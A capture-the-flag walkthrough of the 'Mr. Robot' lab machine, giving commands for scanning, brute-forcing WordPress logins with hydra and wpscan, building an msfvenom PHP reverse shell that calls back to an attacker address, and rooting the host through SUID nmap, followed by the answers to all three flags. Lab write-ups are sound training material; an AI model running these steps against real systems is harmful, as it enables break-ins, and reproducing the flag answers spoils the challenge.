# Mr. Robot 
# Walkthrough by little-human
# Dated : 2nd may, 2022


> Machine ip : `10.10.72.147`

first we will start by scanning the machine with nmap
```
nmap -A -sV 10.10.72.147 -oN aggresive-nmap.txt
```

now lets scan the machine with gobuster
```
gobuster dir -u http://10.10.72.147 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 70 | tee dir.txt

```
we found robots.txt and there we have two file lets download these two files.
```
wget http://10.10.72.147/key-1-of-3.txt
wget http://10.10.72.147/fsocity.dic
```

so till now we have found one key out of three.


the file `fsociety.dic` looks like a password wordlist. we will use this to bruteforce every logins.

lets first remove the duplicates from the wordlist.

```
cat fsocity.dic | sort | uniq > rock.txt
```
now if we try to browse the paths we have found in gobuster scans we can get a wordpress login page when we go to `http://10.10.72.147/dashboard`

lets enumerate all users using hydra :

```
hydra -L fsocity.dic  -p 1234 10.10.72.147 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

now lets bruteforce the password using the wp-scan :
```
wpscan --url http://10.10.72.147/wp-login.php -U Elliot -P rock.txt 
```
now as we are loged in we will upload a php reverse shell and using metasploit we will try to connect to the server :
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.48.110 LPORT=4444 > payload.php
```

now start msfconsole and configure multi/handler.

we will upload the payload.php as a plugin and after uploading it we can see it in the media tab and from there we can run it after setting msf multi/handler in our local machine.

in home directory of the server we can find the users and its password hash also the flag 2.

spawning a tty shell : 
```
pythom -c 'import pty; pty.spawn("/bin/sh")'
```

after getting a shell just login with the credentials found earlier and read the flag 2.

search for SUID set bit for privilage escalation :
```
find /usr -user root -perm /4000
```

we can see that `nmap` has SUID bit set so we will use the interactive mode of nmap to exploit

```
nmap --interactive
```

after entering into nmap shell we can see help manual to run shell command :

```
! /bin/sh
```

ta-da we got the root shell.






| Que$t1on$ | An$wer$ |
|-----------|---------|
| What is key 1 ? | 073403c8a58a1f80d943455fb30724b9 |
| What is key 2 ? | 822c73956184f694993bede3eb39f959 |
| What is key 3 ? | 04787ddef27c3dee1ee161b21670b4e4 |





--------------THE END----------------
